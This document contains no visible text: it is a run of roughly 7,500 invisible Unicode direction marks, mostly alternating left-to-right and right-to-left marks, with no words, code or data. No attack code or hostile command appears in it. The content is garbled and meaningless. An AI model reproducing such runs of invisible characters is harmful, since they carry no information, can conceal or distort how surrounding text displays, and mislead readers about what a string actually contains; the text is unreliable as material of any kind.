‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎